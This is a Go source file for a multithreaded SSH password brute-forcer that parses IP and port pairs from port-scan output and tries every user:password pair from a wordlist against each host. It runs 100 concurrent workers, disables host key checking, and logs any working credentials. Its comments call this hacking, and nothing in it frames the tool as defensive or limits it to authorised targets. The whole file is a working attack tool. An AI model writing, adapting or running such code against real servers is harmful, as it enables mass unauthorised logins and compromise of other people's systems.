package main

import (
	"bufio"
	"flag"
	"fmt"
	"go-network-tools/utils/log"
	"io"
	"net"
	"os"
	"regexp"
	"strings"
	"sync"
	"time"

	"golang.org/x/crypto/ssh"
)

var (
	ipReg          = flag.String("ipgetter", `\[([0-9]+\.[0-9]+\.[0-9]+\.[0-9]+)\]`, "ip getter")
	portReg        = flag.String("portgetter", `tcp port \[([0-9]+)\]`, "port getter")
	ipListFile     = flag.String("file", "", "ip port list")
	numThread      = flag.Int("threads", 100, "num thread to run")
	userpasswdfile = flag.String("userpwfile", "", "user password file")
	sshTimeout     = flag.Duration("sshtimeout", 3*time.Second, "ssh timeout")
	debug          = flag.Bool("debug", false, "display debug log")
)

func checkArgs() error {
	if *ipReg == "" || *portReg == "" {
		return fmt.Errorf("please check args")
	}
	return nil
}

func getUserPassword(file string) [][2]string {
	fi, err := os.Open(file)
	if err != nil {
		panic(err)
	}
	defer fi.Close()
	ret := make([][2]string, 0)
	buf := bufio.NewReader(fi)
	for {
		line, err := buf.ReadString('\n')

		if err != nil {
			if err == io.EOF {
				break
			} else {
				return [][2]string{}
			}
		}
		parts := strings.Split(line, ":")
		if len(parts) == 2 {
			ret = append(ret, [2]string{strings.Trim(parts[0], "\n"), strings.Trim(parts[1], "\n")})
		}
	}
	return ret
}

// ./ssh -file iplist.txt -ipgetter "\[([0-9]+\.[0-9]+\.[0-9]+\.[0-9]+)\]" -portgetter "tcp port \[([0-9]+)\]" -userpwfile up.txt
func main() {
	defer log.Clean()
	log.EnableDebug(*debug)
	flag.Parse()
	if err := checkArgs(); err != nil {
		panic(err)
	}
	up := getUserPassword(*userpasswdfile)
	ch := make(chan string, *numThread)
	var wg sync.WaitGroup
	wg.Add(1)
	go product(ch, *ipListFile, &wg)
	for i := 0; i < *numThread; i++ {
		wg.Add(1)
		go work(i, ch, &wg, up)
	}
	wg.Wait()
}

func product(ch chan string, file string, wg *sync.WaitGroup) {
	defer wg.Done()
	defer close(ch)

	var read io.Reader
	if file != "" {
		fi, err := os.Open(file)
		if err != nil {
			panic(err)
		}
		defer fi.Close()
		read = fi
	} else {
		read = os.Stdin
	}

	buf := bufio.NewReader(read)
	ipGetter := regexp.MustCompile(*ipReg)
	portGetter := regexp.MustCompile(*portReg)
	for {

		line, err := buf.ReadString('\n')
		if err != nil {
			if err == io.EOF {
				break
			} else {
				panic("Read file error!")
			}
		}
		if strings.Contains(line, "SSH") {
			ips := ipGetter.FindStringSubmatch(line)
			ports := portGetter.FindStringSubmatch(line)
			if len(ips) != 2 || len(ports) != 2 {
				log.MyLogI("%s parse err\n", line)
				continue
			} else {
				log.MyLogD("product %s:%s", ips[1], ports[1])
				ch <- fmt.Sprintf("%s:%s", ips[1], ports[1])
			}
		}
	}
}

func work(workid int, ch chan string, wg *sync.WaitGroup, userpw [][2]string) {
	defer wg.Done()
	for {
		find := false
		select {
		case ip_port := <-ch:
			if ip_port == "" {
				return
			}
			for _, up := range userpw {
				//log.MyLogS("start hack %s use %s:%s", ip_port, up[0], up[1])
				if checkSSHPasswd(ip_port, up[0], up[1]) {
					log.MyLogI("%s is use user:%s, pw:%s", ip_port, up[0], up[1])
					find = true
					break
				}
			}
			if find == false {
				log.MyLogD("%s cann't be hack", ip_port)
			}
		}
	}
}
func checkSSHPasswd(ip_port string, user, password string) bool {
	PassWd := []ssh.AuthMethod{ssh.Password(password)}
	Conf := ssh.ClientConfig{
		User:    user,
		Auth:    PassWd,
		Timeout: *sshTimeout,
		HostKeyCallback: func(hostname string, remote net.Addr, key ssh.PublicKey) error {
			return nil
		},
	}
	Client, err := ssh.Dial("tcp", ip_port, &Conf)
	if err != nil {
		//fmt.Printf("ip_port:%s, %s:%s , err:%v\n", ip_port, user, password, err)
		return false
	}
	defer Client.Close()
	return true
}
